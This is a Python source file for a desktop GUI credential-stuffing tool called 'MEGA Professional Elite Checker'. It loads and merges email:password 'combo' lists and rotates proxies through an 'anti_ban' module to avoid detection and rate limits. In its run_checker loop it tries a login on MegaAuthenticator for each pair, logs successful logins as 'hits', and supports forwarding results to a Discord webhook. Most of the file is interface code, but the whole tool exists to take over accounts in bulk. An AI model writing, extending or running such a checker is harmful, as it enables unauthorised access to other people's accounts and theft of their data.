"""
MEGA Professional Elite Checker v4.0
Professional, Clean, Enterprise-Grade Interface
"""

import customtkinter as ctk
from tkinter import filedialog, messagebox
import threading
import os
import logging
from pathlib import Path
from datetime import datetime
import time
from typing import List, Dict, Optional
import re

from checker_engine import CheckerEngine
from discord_notifier import DiscordNotifier
from proxy_rotator import anti_ban
from proxy_fetcher import proxy_fetcher
from theme_manager import theme_manager
from session_manager import session_manager
from plugin_manager import plugin_manager

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Professional dark theme
ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("blue")


class AICore:
    """Fast and efficient AI assistant"""
    
    def __init__(self):
        self.patterns = []
    
    def quick_scan(self, combo_file: str) -> Dict:
        """Fast combo scan"""
        try:
            with open(combo_file, 'r', encoding='utf-8', errors='ignore') as f:
                lines = [line.strip() for line in f if line.strip() and not line.startswith('#')]
            
            valid = sum(1 for line in lines if ':' in line and '@' in line.split(':')[0])
            total = len(lines)
            score = int((valid / total * 100)) if total > 0 else 0
            
            return {
                'total': total,
                'valid': valid,
                'score': score,
                'status': 'Ready' if score > 70 else 'Needs Cleaning'
            }
        except:
            return {'total': 0, 'valid': 0, 'score': 0, 'status': 'Error'}
    
    def auto_settings(self, combo_size: int, has_proxies: bool) -> Dict:
        """Smart settings calculation"""
        if combo_size < 100:
            return {'rate': 15, 'delay_min': 3, 'delay_max': 6, 'est': combo_size // 10}
        elif combo_size < 500:
            rate = 25 if has_proxies else 15
            return {'rate': rate, 'delay_min': 2, 'delay_max': 5, 'est': combo_size // rate}
        else:
            rate = 35 if has_proxies else 12
            return {'rate': rate, 'delay_min': 2, 'delay_max': 4, 'est': combo_size // rate}


class MegaProElite(ctk.CTk):
    """Professional enterprise-grade MEGA checker"""
    
    def __init__(self):
        super().__init__()
        
        # Window setup
        self.title("MEGA Professional Elite - Account Checker")
        self.geometry("1500x900")
        self.resizable(True, True)
        
        # Professional color palette (sophisticated, minimal, clean)
        self.colors = {
            # Primary colors - Deep blue theme
            'primary': '#1a73e8',           # Professional blue
            'primary_hover': '#1557b0',     # Darker blue on hover
            'primary_light': '#4285f4',     # Light blue accent
            
            # Status colors
            'success': '#34a853',           # Professional green
            'warning': '#fbbc04',           # Professional amber
            'error': '#ea4335',             # Professional red
            'info': '#4285f4',              # Professional info blue
            
            # Background colors - Deep, professional
            'bg_main': '#0f1419',           # Deep charcoal
            'bg_secondary': '#1a1f2e',      # Slightly lighter
            'bg_elevated': '#232938',       # Elevated surfaces
            'bg_input': '#2d3548',          # Input fields
            
            # Text colors
            'text_primary': '#e8eaed',      # Primary text - light gray
            'text_secondary': '#9aa0a6',    # Secondary text - muted
            'text_tertiary': '#5f6368',     # Tertiary text - very muted
            
            # Border colors
            'border_main': '#3c4043',       # Subtle borders
            'border_light': '#5f6368',      # Lighter borders
            'border_focus': '#1a73e8',      # Focus state
            
            # Gradient accents
            'accent_1': '#667eea',          # Subtle purple
            'accent_2': '#764ba2',          # Deep purple
        }
        
        # Configure window
        self.configure(fg_color=self.colors['bg_main'])
        
        # Initialize
        self.ai = AICore()
        self.checker_engine = CheckerEngine()
        self.discord_notifier = DiscordNotifier()
        self.combo_files = []
        self.checking_thread = None
        self.stop_checking = False
        
        # Discover themes and plugins
        theme_manager.discover_themes()
        plugin_manager.discover_plugins()
        self.available_themes = ["Default"] + [t['name'] for t in theme_manager.get_theme_list()]
        self.current_theme_name = "Default"
        
        # Stats
        self.stats = {
            'checked': 0,
            'hits': 0,
            'fails': 0,
            'start_time': None
        }
        
        # Set callbacks
        self.checker_engine.set_callbacks(
            self.update_progress,
            self.log_message
        )
        
        # Build UI
        self.create_professional_ui()
        
        # Welcome
        self.log_message("System initialized successfully", "success")
        self.log_message("All modules loaded and ready", "info")
    
    def create_professional_ui(self):
        """Create professional interface"""
        
        # ===== HEADER =====
        header = ctk.CTkFrame(
            self,
            height=70,
            fg_color=self.colors['bg_secondary'],
            corner_radius=0
        )
        header.pack(fill="x", padx=0, pady=0)
        header.pack_propagate(False)
        
        # Header content container
        header_content = ctk.CTkFrame(header, fg_color="transparent")
        header_content.pack(fill="both", expand=True, padx=30, pady=0)
        
        # Logo and title
        title_frame = ctk.CTkFrame(header_content, fg_color="transparent")
        title_frame.pack(side="left", fill="y")
        
        logo_title = ctk.CTkLabel(
            title_frame,
            text="MEGA Professional Elite",
            font=ctk.CTkFont(family="Segoe UI", size=22, weight="bold"),
            text_color=self.colors['text_primary']
        )
        logo_title.pack(side="left", padx=(0, 10))
        
        version_badge = ctk.CTkLabel(
            title_frame,
            text="v4.0",
            font=ctk.CTkFont(family="Segoe UI", size=11),
            text_color=self.colors['text_secondary'],
            fg_color=self.colors['bg_elevated'],
            corner_radius=4,
            padx=8,
            pady=2
        )
        version_badge.pack(side="left")
        
        # Status indicator
        self.header_status = ctk.CTkLabel(
            header_content,
            text="● Ready",
            font=ctk.CTkFont(family="Segoe UI", size=13),
            text_color=self.colors['success']
        )
        self.header_status.pack(side="right", pady=0)
        
        # ===== MAIN CONTAINER =====
        main = ctk.CTkFrame(self, fg_color="transparent")
        main.pack(fill="both", expand=True, padx=0, pady=0)
        
        # Sidebar (300px) and Content Area
        sidebar = ctk.CTkFrame(
            main,
            width=320,
            fg_color=self.colors['bg_secondary'],
            corner_radius=0
        )
        sidebar.pack(side="left", fill="both", padx=0, pady=0)
        sidebar.pack_propagate(False)
        
        content_area = ctk.CTkFrame(
            main,
            fg_color=self.colors['bg_main'],
            corner_radius=0
        )
        content_area.pack(side="left", fill="both", expand=True, padx=0, pady=0)
        
        # Action buttons column (right side)
        actions_column = ctk.CTkFrame(
            main,
            width=200,
            fg_color=self.colors['bg_secondary'],
            corner_radius=0
        )
        actions_column.pack(side="left", fill="y", padx=0, pady=0)
        actions_column.pack_propagate(False)
        
        # Build sections
        self.create_sidebar(sidebar)
        self.create_content_area(content_area)
        self.create_actions_column(actions_column)
    
    def create_sidebar(self, parent):
        """Create sidebar with controls"""
        
        # Scrollable content
        scrollable = ctk.CTkScrollableFrame(
            parent,
            fg_color="transparent",
            scrollbar_button_color=self.colors['bg_elevated'],
            scrollbar_button_hover_color=self.colors['border_light']
        )
        scrollable.pack(fill="both", expand=True, padx=0, pady=0)
        
        # ===== COMBO SECTION =====
        self.create_section(scrollable, "Combo Files")
        
        combo_frame = ctk.CTkFrame(scrollable, fg_color="transparent")
        combo_frame.pack(fill="x", padx=20, pady=(0, 20))
        
        # Load buttons
        btn_frame = ctk.CTkFrame(combo_frame, fg_color="transparent")
        btn_frame.pack(fill="x", pady=(0, 10))
        
        load_single_btn = ctk.CTkButton(
            btn_frame,
            text="Load Single File",
            font=ctk.CTkFont(family="Segoe UI", size=13),
            fg_color=self.colors['bg_elevated'],
            hover_color=self.colors['bg_input'],
            text_color=self.colors['text_primary'],
            border_width=1,
            border_color=self.colors['border_main'],
            height=38,
            corner_radius=6,
            command=self.load_single_combo
        )
        load_single_btn.pack(side="left", fill="x", expand=True, padx=(0, 8))
        
        load_multi_btn = ctk.CTkButton(
            btn_frame,
            text="Merge Multiple",
            font=ctk.CTkFont(family="Segoe UI", size=13),
            fg_color=self.colors['bg_elevated'],
            hover_color=self.colors['bg_input'],
            text_color=self.colors['text_primary'],
            border_width=1,
            border_color=self.colors['border_main'],
            height=38,
            corner_radius=6,
            command=self.load_multi_combo
        )
        load_multi_btn.pack(side="left", fill="x", expand=True)
        
        # Combo display
        self.combo_display = ctk.CTkTextbox(
            combo_frame,
            height=70,
            font=ctk.CTkFont(family="Consolas", size=11),
            fg_color=self.colors['bg_input'],
            border_width=1,
            border_color=self.colors['border_main'],
            text_color=self.colors['text_secondary'],
            corner_radius=6
        )
        self.combo_display.pack(fill="x")
        self.combo_display.insert("1.0", "No files loaded")
        self.combo_display.configure(state="disabled")
        
        # Session management buttons
        session_frame = ctk.CTkFrame(combo_frame, fg_color="transparent")
        session_frame.pack(fill="x", pady=(10, 0))
        
        save_session_btn = ctk.CTkButton(
            session_frame,
            text="💾 Save Session",
            font=ctk.CTkFont(family="Segoe UI", size=12),
            fg_color=self.colors['info'],
            hover_color="#1557b0",
            text_color="white",
            border_width=0,
            height=34,
            corner_radius=6,
            command=self.save_current_session
        )
        save_session_btn.pack(side="left", fill="x", expand=True, padx=(0, 8))
        
        load_session_btn = ctk.CTkButton(
            session_frame,
            text="📂 Load Session",
            font=ctk.CTkFont(family="Segoe UI", size=12),
            fg_color=self.colors['success'],
            hover_color="#2d8f47",
            text_color="white",
            border_width=0,
            height=34,
            corner_radius=6,
            command=self.load_saved_session
        )
        load_session_btn.pack(side="left", fill="x", expand=True)
        
        # AI Scan
        scan_btn = ctk.CTkButton(
            combo_frame,
            text="⚡ Quick AI Scan",
            font=ctk.CTkFont(family="Segoe UI", size=13, weight="bold"),
            fg_color=self.colors['primary'],
            hover_color=self.colors['primary_hover'],
            text_color="white",
            height=38,
            corner_radius=6,
            command=self.ai_quick_scan
        )
        scan_btn.pack(fill="x", pady=(10, 5))
        
        self.ai_status = ctk.CTkLabel(
            combo_frame,
            text="Awaiting scan...",
            font=ctk.CTkFont(family="Segoe UI", size=11),
            text_color=self.colors['text_tertiary'],
            anchor="w"
        )
        self.ai_status.pack(fill="x", pady=(0, 0))
        
        # Separator
        ctk.CTkFrame(scrollable, height=1, fg_color=self.colors['border_main']).pack(fill="x", padx=20, pady=20)
        
        # ===== PROXY SECTION =====
        self.create_section(scrollable, "Proxy Configuration")
        
        proxy_frame = ctk.CTkFrame(scrollable, fg_color="transparent")
        proxy_frame.pack(fill="x", padx=20, pady=(0, 20))
        
        # Enable proxy switch
        self.proxy_var = ctk.BooleanVar(value=False)
        proxy_switch = ctk.CTkSwitch(
            proxy_frame,
            text="Enable Proxy Rotation",
            font=ctk.CTkFont(family="Segoe UI", size=13),
            variable=self.proxy_var,
            fg_color=self.colors['border_main'],
            progress_color=self.colors['primary'],
            button_color=self.colors['text_primary'],
            button_hover_color=self.colors['bg_input'],
            text_color=self.colors['text_primary'],
            command=self.toggle_proxy
        )
        proxy_switch.pack(anchor="w", pady=(0, 10))
        
        # Proxy fetch buttons
        proxy_btn_frame = ctk.CTkFrame(proxy_frame, fg_color="transparent")
        proxy_btn_frame.pack(fill="x", pady=(0, 8))
        
        fetch_btn = ctk.CTkButton(
            proxy_btn_frame,
            text="🌐 Auto-Fetch",
            font=ctk.CTkFont(family="Segoe UI", size=12),
            fg_color=self.colors['bg_elevated'],
            hover_color=self.colors['bg_input'],
            text_color=self.colors['text_primary'],
            border_width=1,
            border_color=self.colors['border_main'],
            height=36,
            corner_radius=6,
            command=self.deploy_proxies
        )
        fetch_btn.pack(side="left", fill="x", expand=True, padx=(0, 8))
        
        ai_fetch_btn = ctk.CTkButton(
            proxy_btn_frame,
            text="🤖 AI Quality",
            font=ctk.CTkFont(family="Segoe UI", size=12, weight="bold"),
            fg_color=self.colors['primary'],
            hover_color=self.colors['primary_hover'],
            text_color="white",
            height=36,
            corner_radius=6,
            command=self.deploy_ai_proxies
        )
        ai_fetch_btn.pack(side="left", fill="x", expand=True)
        
        self.proxy_status = ctk.CTkLabel(
            proxy_frame,
            text="Proxy: Disabled",
            font=ctk.CTkFont(family="Segoe UI", size=11),
            text_color=self.colors['text_tertiary']
        )
        self.proxy_status.pack(anchor="w")
        
        # Separator
        ctk.CTkFrame(scrollable, height=1, fg_color=self.colors['border_main']).pack(fill="x", padx=20, pady=20)
        
        # ===== SETTINGS =====
        self.create_section(scrollable, "Settings")
        
        settings_frame = ctk.CTkFrame(scrollable, fg_color="transparent")
        settings_frame.pack(fill="x", padx=20, pady=(0, 20))
        
        # Rate limit
        rate_label = ctk.CTkLabel(
            settings_frame,
            text="Request Rate",
            font=ctk.CTkFont(family="Segoe UI", size=12),
            text_color=self.colors['text_secondary'],
            anchor="w"
        )
        rate_label.pack(fill="x", pady=(0, 5))
        
        self.rate_slider = ctk.CTkSlider(
            settings_frame,
            from_=5,
            to=50,
            number_of_steps=45,
            fg_color=self.colors['bg_elevated'],
            progress_color=self.colors['primary'],
            button_color=self.colors['primary_light'],
            button_hover_color=self.colors['primary'],
            height=18,
            command=self.update_rate_label
        )
        self.rate_slider.set(20)
        self.rate_slider.pack(fill="x", pady=(0, 5))
        
        self.rate_label = ctk.CTkLabel(
            settings_frame,
            text="20 requests/minute",
            font=ctk.CTkFont(family="Segoe UI", size=11),
            text_color=self.colors['text_tertiary'],
            anchor="w"
        )
        self.rate_label.pack(fill="x", pady=(0, 15))
        
        # Delays
        delay_container = ctk.CTkFrame(settings_frame, fg_color="transparent")
        delay_container.pack(fill="x", pady=(0, 15))
        
        # Min delay
        min_frame = ctk.CTkFrame(delay_container, fg_color="transparent")
        min_frame.pack(side="left", fill="x", expand=True, padx=(0, 8))
        
        ctk.CTkLabel(
            min_frame,
            text="Min Delay (s)",
            font=ctk.CTkFont(family="Segoe UI", size=11),
            text_color=self.colors['text_secondary'],
            anchor="w"
        ).pack(fill="x")
        
        self.min_delay_entry = ctk.CTkEntry(
            min_frame,
            height=36,
            font=ctk.CTkFont(family="Segoe UI", size=12),
            fg_color=self.colors['bg_input'],
            border_width=1,
            border_color=self.colors['border_main'],
            text_color=self.colors['text_primary'],
            corner_radius=6
        )
        self.min_delay_entry.insert(0, "2.0")
        self.min_delay_entry.pack(fill="x", pady=(5, 0))
        
        # Max delay
        max_frame = ctk.CTkFrame(delay_container, fg_color="transparent")
        max_frame.pack(side="left", fill="x", expand=True)
        
        ctk.CTkLabel(
            max_frame,
            text="Max Delay (s)",
            font=ctk.CTkFont(family="Segoe UI", size=11),
            text_color=self.colors['text_secondary'],
            anchor="w"
        ).pack(fill="x")
        
        self.max_delay_entry = ctk.CTkEntry(
            max_frame,
            height=36,
            font=ctk.CTkFont(family="Segoe UI", size=12),
            fg_color=self.colors['bg_input'],
            border_width=1,
            border_color=self.colors['border_main'],
            text_color=self.colors['text_primary'],
            corner_radius=6
        )
        self.max_delay_entry.insert(0, "5.0")
        self.max_delay_entry.pack(fill="x", pady=(5, 0))
        
        # Discord webhook
        webhook_label = ctk.CTkLabel(
            settings_frame,
            text="Discord Webhook URL",
            font=ctk.CTkFont(family="Segoe UI", size=12),
            text_color=self.colors['text_secondary'],
            anchor="w"
        )
        webhook_label.pack(fill="x", pady=(0, 5))
        
        self.webhook_entry = ctk.CTkEntry(
            settings_frame,
            height=36,
            placeholder_text="https://discord.com/api/webhooks/...",
            font=ctk.CTkFont(family="Segoe UI", size=11),
            fg_color=self.colors['bg_input'],
            border_width=1,
            border_color=self.colors['border_main'],
            text_color=self.colors['text_primary'],
            placeholder_text_color=self.colors['text_tertiary'],
            corner_radius=6
        )
        self.webhook_entry.pack(fill="x", pady=(0, 8))
        
        test_webhook_btn = ctk.CTkButton(
            settings_frame,
            text="Test Webhook",
            font=ctk.CTkFont(family="Segoe UI", size=12),
            fg_color=self.colors['bg_elevated'],
            hover_color=self.colors['bg_input'],
            text_color=self.colors['text_primary'],
            border_width=1,
            border_color=self.colors['border_main'],
            height=34,
            corner_radius=6,
            command=self.test_webhook
        )
        test_webhook_btn.pack(fill="x")
        
        # Separator
        ctk.CTkFrame(scrollable, height=1, fg_color=self.colors['border_main']).pack(fill="x", padx=20, pady=20)
        
        # ===== THEME SECTION =====
        self.create_section(scrollable, "Appearance")
        
        theme_frame = ctk.CTkFrame(scrollable, fg_color="transparent")
        theme_frame.pack(fill="x", padx=20, pady=(0, 20))
        
        theme_label = ctk.CTkLabel(
            theme_frame,
            text="Color Theme",
            font=ctk.CTkFont(family="Segoe UI", size=12),
            text_color=self.colors['text_secondary'],
            anchor="w"
        )
        theme_label.pack(fill="x", pady=(0, 5))
        
        self.theme_dropdown = ctk.CTkOptionMenu(
            theme_frame,
            values=self.available_themes,
            command=self.apply_theme,
            height=36,
            font=ctk.CTkFont(family="Segoe UI", size=11),
            fg_color=self.colors['bg_input'],
            button_color=self.colors['primary'],
            button_hover_color=self.colors['primary_hover'],
            dropdown_fg_color=self.colors['bg_elevated'],
            text_color=self.colors['text_primary'],
            corner_radius=6
        )
        self.theme_dropdown.pack(fill="x", pady=(0, 10))
        self.theme_dropdown.set("Default")
        
        # Theme info
        self.theme_info = ctk.CTkLabel(
            theme_frame,
            text="Using default professional theme",
            font=ctk.CTkFont(family="Segoe UI", size=10),
            text_color=self.colors['text_tertiary'],
            anchor="w"
        )
        self.theme_info.pack(fill="x")
    
    def create_content_area(self, parent):
        """Create main content area"""
        
        # Padding container
        container = ctk.CTkFrame(parent, fg_color="transparent")
        container.pack(fill="both", expand=True, padx=25, pady=20)
        
        # ===== STATS CARDS =====
        stats_container = ctk.CTkFrame(container, fg_color="transparent")
        stats_container.pack(fill="x", pady=(0, 20))
        
        # Create stat cards
        self.stat_checked = self.create_stat_card(
            stats_container,
            "Checked",
            "0",
            self.colors['primary']
        )
        self.stat_checked.pack(side="left", fill="x", expand=True, padx=(0, 15))
        
        self.stat_hits = self.create_stat_card(
            stats_container,
            "Hits",
            "0",
            self.colors['success']
        )
        self.stat_hits.pack(side="left", fill="x", expand=True, padx=(0, 15))
        
        self.stat_fails = self.create_stat_card(
            stats_container,
            "Fails",
            "0",
            self.colors['text_tertiary']
        )
        self.stat_fails.pack(side="left", fill="x", expand=True)
        
        # ===== PROGRESS =====
        progress_card = ctk.CTkFrame(
            container,
            fg_color=self.colors['bg_secondary'],
            corner_radius=12
        )
        progress_card.pack(fill="x", pady=(0, 20))
        
        progress_inner = ctk.CTkFrame(progress_card, fg_color="transparent")
        progress_inner.pack(fill="x", padx=25, pady=20)
        
        # Progress header
        progress_header = ctk.CTkFrame(progress_inner, fg_color="transparent")
        progress_header.pack(fill="x", pady=(0, 15))
        
        ctk.CTkLabel(
            progress_header,
            text="Progress",
            font=ctk.CTkFont(family="Segoe UI", size=15, weight="bold"),
            text_color=self.colors['text_primary']
        ).pack(side="left")
        
        self.progress_text = ctk.CTkLabel(
            progress_header,
            text="0 / 0 (0%)",
            font=ctk.CTkFont(family="Segoe UI", size=13),
            text_color=self.colors['text_secondary']
        )
        self.progress_text.pack(side="right")
        
        # Progress bar
        self.progress_bar = ctk.CTkProgressBar(
            progress_inner,
            height=20,
            fg_color=self.colors['bg_elevated'],
            progress_color=self.colors['primary'],
            corner_radius=10
        )
        self.progress_bar.set(0)
        self.progress_bar.pack(fill="x")
        
        # ===== METRICS =====
        metrics_card = ctk.CTkFrame(
            container,
            fg_color=self.colors['bg_secondary'],
            corner_radius=12
        )
        metrics_card.pack(fill="x", pady=(0, 20))
        
        metrics_inner = ctk.CTkFrame(metrics_card, fg_color="transparent")
        metrics_inner.pack(fill="x", padx=25, pady=20)
        
        ctk.CTkLabel(
            metrics_inner,
            text="Live Metrics",
            font=ctk.CTkFont(family="Segoe UI", size=15, weight="bold"),
            text_color=self.colors['text_primary']
        ).pack(anchor="w", pady=(0, 10))
        
        self.metrics_display = ctk.CTkTextbox(
            metrics_inner,
            height=120,
            font=ctk.CTkFont(family="Consolas", size=11),
            fg_color=self.colors['bg_elevated'],
            border_width=0,
            text_color=self.colors['text_secondary'],
            corner_radius=8
        )
        self.metrics_display.pack(fill="x")
        self.metrics_display.insert("1.0", "No active session\n\nMetrics will appear here when checking starts...")
        
        # ===== CONSOLE =====
        console_card = ctk.CTkFrame(
            container,
            fg_color=self.colors['bg_secondary'],
            corner_radius=12
        )
        console_card.pack(fill="both", expand=True)
        
        console_inner = ctk.CTkFrame(console_card, fg_color="transparent")
        console_inner.pack(fill="both", expand=True, padx=25, pady=20)
        
        # Console header
        console_header = ctk.CTkFrame(console_inner, fg_color="transparent")
        console_header.pack(fill="x", pady=(0, 10))
        
        ctk.CTkLabel(
            console_header,
            text="Console Output",
            font=ctk.CTkFont(family="Segoe UI", size=15, weight="bold"),
            text_color=self.colors['text_primary']
        ).pack(side="left")
        
        clear_btn = ctk.CTkButton(
            console_header,
            text="Clear",
            width=70,
            height=28,
            font=ctk.CTkFont(family="Segoe UI", size=11),
            fg_color=self.colors['bg_elevated'],
            hover_color=self.colors['bg_input'],
            text_color=self.colors['text_secondary'],
            corner_radius=6,
            command=self.clear_console
        )
        clear_btn.pack(side="right")
        
        # Console
        self.console = ctk.CTkTextbox(
            console_inner,
            font=ctk.CTkFont(family="Consolas", size=11),
            fg_color=self.colors['bg_elevated'],
            border_width=0,
            text_color=self.colors['text_secondary'],
            corner_radius=8
        )
        self.console.pack(fill="both", expand=True)
        self.console.configure(state="disabled")
    
    def create_actions_column(self, parent):
        """Create action buttons column on the right"""
        
        # Padding container
        container = ctk.CTkFrame(parent, fg_color="transparent")
        container.pack(fill="both", expand=True, padx=15, pady=20)
        
        # Section label
        ctk.CTkLabel(
            container,
            text="ACTIONS",
            font=ctk.CTkFont(family="Segoe UI", size=11, weight="bold"),
            text_color=self.colors['text_tertiary'],
            anchor="w"
        ).pack(fill="x", pady=(0, 20))
        
        # Start button
        self.start_btn = ctk.CTkButton(
            container,
            text="▶  Start\nChecking",
            font=ctk.CTkFont(family="Segoe UI", size=14, weight="bold"),
            fg_color=self.colors['primary'],
            hover_color=self.colors['primary_hover'],
            text_color="white",
            height=80,
            corner_radius=8,
            command=self.start_checking
        )
        self.start_btn.pack(fill="x", pady=(0, 15))
        
        # Stop button
        self.stop_btn = ctk.CTkButton(
            container,
            text="⏹  Stop",
            font=ctk.CTkFont(family="Segoe UI", size=13, weight="bold"),
            fg_color=self.colors['error'],
            hover_color="#c53929",
            text_color="white",
            height=60,
            corner_radius=8,
            state="disabled",
            command=self.stop_checking_process
        )
        self.stop_btn.pack(fill="x", pady=(0, 15))
        
        # Export button
        self.export_btn = ctk.CTkButton(
            container,
            text="📥  Export\nResults",
            font=ctk.CTkFont(family="Segoe UI", size=12, weight="bold"),
            fg_color=self.colors['success'],
            hover_color="#2d8f47",
            text_color="white",
            height=60,
            corner_radius=8,
            command=self.export_results
        )
        self.export_btn.pack(fill="x", pady=(0, 30))
        
        # Separator
        ctk.CTkFrame(container, height=1, fg_color=self.colors['border_main']).pack(fill="x", pady=(0, 20))
        
        # Quick stats
        stats_label = ctk.CTkLabel(
            container,
            text="QUICK STATS",
            font=ctk.CTkFont(family="Segoe UI", size=10, weight="bold"),
            text_color=self.colors['text_tertiary'],
            anchor="w"
        )
        stats_label.pack(fill="x", pady=(0, 10))
        
        self.quick_stats = ctk.CTkTextbox(
            container,
            height=120,
            font=ctk.CTkFont(family="Consolas", size=10),
            fg_color=self.colors['bg_elevated'],
            border_width=0,
            text_color=self.colors['text_secondary'],
            corner_radius=6
        )
        self.quick_stats.pack(fill="x")
        self.quick_stats.insert("1.0", "Checked: 0\nHits: 0\nFails: 0\nRate: 0/min")
        self.quick_stats.configure(state="disabled")
    
    def create_section(self, parent, title: str):
        """Create section header"""
        label = ctk.CTkLabel(
            parent,
            text=title.upper(),
            font=ctk.CTkFont(family="Segoe UI", size=11, weight="bold"),
            text_color=self.colors['text_tertiary'],
            anchor="w"
        )
        label.pack(fill="x", padx=20, pady=(20, 10))
    
    def create_stat_card(self, parent, label: str, value: str, accent_color: str):
        """Create a stat card"""
        card = ctk.CTkFrame(
            parent,
            fg_color=self.colors['bg_secondary'],
            corner_radius=12,
            height=110
        )
        card.pack_propagate(False)
        
        inner = ctk.CTkFrame(card, fg_color="transparent")
        inner.pack(fill="both", expand=True, padx=20, pady=20)
        
        # Label
        label_widget = ctk.CTkLabel(
            inner,
            text=label,
            font=ctk.CTkFont(family="Segoe UI", size=12),
            text_color=self.colors['text_secondary'],
            anchor="w"
        )
        label_widget.pack(anchor="w")
        
        # Value
        value_widget = ctk.CTkLabel(
            inner,
            text=value,
            font=ctk.CTkFont(family="Segoe UI", size=36, weight="bold"),
            text_color=accent_color,
            anchor="w"
        )
        value_widget.pack(anchor="w", pady=(5, 0))
        
        card.value_widget = value_widget
        return card
    
    # ========== AI FUNCTIONS ==========
    
    def ai_quick_scan(self):
        """Quick AI scan"""
        if not self.combo_files:
            self.log_message("No combo files loaded", "error")
            return
        
        self.log_message("Running AI scan...", "info")
        result = self.ai.quick_scan(self.combo_files[0])
        
        status_text = f"Total: {result['total']} | Valid: {result['valid']} | Quality: {result['score']}% | Status: {result['status']}"
        self.ai_status.configure(text=status_text)
        
        if result['score'] > 70:
            self.ai_status.configure(text_color=self.colors['success'])
            self.log_message(f"Scan complete: {result['status']}", "success")
        else:
            self.ai_status.configure(text_color=self.colors['warning'])
            self.log_message(f"Scan complete: {result['status']}", "warning")
    
    # ========== COMBO FUNCTIONS ==========
    
    def load_single_combo(self):
        """Load single combo file"""
        file = filedialog.askopenfilename(
            title="Select Combo File",
            filetypes=[("Text files", "*.txt"), ("All files", "*.*")]
        )
        
        if file:
            self.combo_files = [file]
            self.update_combo_display()
            self.log_message(f"Loaded: {os.path.basename(file)}", "success")
            self.ai_quick_scan()
    
    def load_multi_combo(self):
        """Load and merge multiple files"""
        files = filedialog.askopenfilenames(
            title="Select Multiple Combo Files",
            filetypes=[("Text files", "*.txt"), ("All files", "*.*")]
        )
        
        if files:
            self.log_message(f"Merging {len(files)} files...", "info")
            
            all_lines = set()
            for file in files:
                try:
                    with open(file, 'r', encoding='utf-8', errors='ignore') as f:
                        lines = [line.strip() for line in f if line.strip() and not line.startswith('#')]
                        all_lines.update(lines)
                except Exception as e:
                    self.log_message(f"Error reading {os.path.basename(file)}: {str(e)}", "error")
            
            merged_file = "merged_combo.txt"
            with open(merged_file, 'w', encoding='utf-8') as f:
                f.write('\n'.join(sorted(all_lines)))
            
            self.combo_files = [merged_file]
            self.update_combo_display()
            
            self.log_message(f"Merged successfully: {len(all_lines)} unique entries", "success")
            self.ai_quick_scan()
    
    def update_combo_display(self):
        """Update combo display"""
        self.combo_display.configure(state="normal")
        self.combo_display.delete("1.0", "end")
        
        if self.combo_files:
            for i, file in enumerate(self.combo_files, 1):
                self.combo_display.insert("end", f"{i}. {os.path.basename(file)}\n")
        else:
            self.combo_display.insert("end", "No files loaded")
        
        self.combo_display.configure(state="disabled")
    
    def auto_clean_duplicates(self, combo_file: str) -> str:
        """Auto-clean duplicates"""
        try:
            self.log_message("Cleaning duplicates...", "info")
            
            with open(combo_file, 'r', encoding='utf-8', errors='ignore') as f:
                lines = [line.strip() for line in f if line.strip() and not line.startswith('#')]
            
            original = len(lines)
            unique = list(set(lines))
            cleaned = len(unique)
            removed = original - cleaned
            
            cleaned_file = combo_file.replace('.txt', '_cleaned.txt')
            with open(cleaned_file, 'w', encoding='utf-8') as f:
                f.write('\n'.join(unique))
            
            self.log_message(f"Removed {removed} duplicates ({cleaned} unique entries)", "success")
            return cleaned_file
            
        except Exception as e:
            self.log_message(f"Cleaning failed: {str(e)}", "error")
            return combo_file
    
    # ========== CHECKING FUNCTIONS ==========
    
    def start_checking(self):
        """Start checking process"""
        if not self.combo_files:
            messagebox.showwarning("Warning", "Please load a combo file first")
            return
        
        if self.checking_thread and self.checking_thread.is_alive():
            messagebox.showwarning("Warning", "Checking already in progress")
            return
        
        # Clean duplicates
        cleaned_combo = self.auto_clean_duplicates(self.combo_files[0])
        
        # Get combo size
        with open(cleaned_combo, 'r', encoding='utf-8', errors='ignore') as f:
            combo_size = len([line for line in f if line.strip()])
        
        # Dynamic proxy count
        if self.proxy_var.get():
            proxy_count = max(20, min(200, int(combo_size * 0.1)))
            self.log_message(f"Calculated proxy count: {proxy_count} for {combo_size} targets", "info")
            
            if len(anti_ban.proxies) < 10:
                self.log_message(f"Auto-deploying {proxy_count} proxies...", "info")
                self.auto_deploy_proxies(proxy_count)
        
        # Apply settings
        self.apply_settings()
        
        # UI updates
        self.start_btn.configure(state="disabled")
        self.stop_btn.configure(state="normal")
        self.header_status.configure(text="● Checking", text_color=self.colors['primary'])
        
        # Reset stats
        self.stats = {'checked': 0, 'hits': 0, 'fails': 0, 'start_time': time.time()}
        self.stop_checking = False
        
        self.log_message("Started checking process", "success")
        self.log_message(f"Target: {combo_size} accounts", "info")
        
        # Start thread
        self.checking_thread = threading.Thread(
            target=self.run_checker,
            args=(cleaned_combo,),
            daemon=True
        )
        self.checking_thread.start()
    
    def stop_checking_process(self):
        """Stop checking"""
        self.stop_checking = True
        self.log_message("Stop signal sent...", "warning")
        self.header_status.configure(text="● Stopping", text_color=self.colors['warning'])
    
    def run_checker(self, combo_file):
        """Run checking process"""
        try:
            with open(combo_file, 'r', encoding='utf-8', errors='ignore') as f:
                combos = [line.strip() for line in f if line.strip() and ':' in line]
            
            total = len(combos)
            
            for i, combo in enumerate(combos, 1):
                if self.stop_checking:
                    self.after(0, lambda: self.log_message("Checking stopped by user", "warning"))
                    break
                
                try:
                    parts = combo.split(':', 1)
                    if len(parts) != 2:
                        continue
                    
                    email, password = parts
                    
                    if self.proxy_var.get():
                        anti_ban.wait_if_needed()
                    
                    from mega_auth import MegaAuthenticator
                    auth = MegaAuthenticator()
                    
                    proxy = anti_ban.get_current_proxy() if self.proxy_var.get() else None
                    success, data, error = auth.login(email, password, proxy)
                    
                    if success:
                        self.stats['hits'] += 1
                        self.after(0, lambda e=email: self.log_message(f"✓ Hit: {e}", "success"))
                        anti_ban.mark_proxy_success()
                    else:
                        self.stats['fails'] += 1
                        anti_ban.mark_proxy_failure()
                    
                    self.stats['checked'] += 1
                    
                except Exception as e:
                    self.stats['fails'] += 1
                    self.after(0, lambda err=str(e)[:50]: self.log_message(f"Error: {err}", "error"))
                
                self.after(0, lambda c=i, t=total: self.update_progress(c, t, self.stats['hits'], 0, self.stats['fails']))
            
        except Exception as e:
            self.after(0, lambda err=str(e): self.log_message(f"Fatal error: {err}", "error"))
        finally:
            self.after(0, self.checking_complete)
    
    def checking_complete(self):
        """Called when checking finishes"""
        self.start_btn.configure(state="normal")
        self.stop_btn.configure(state="disabled")
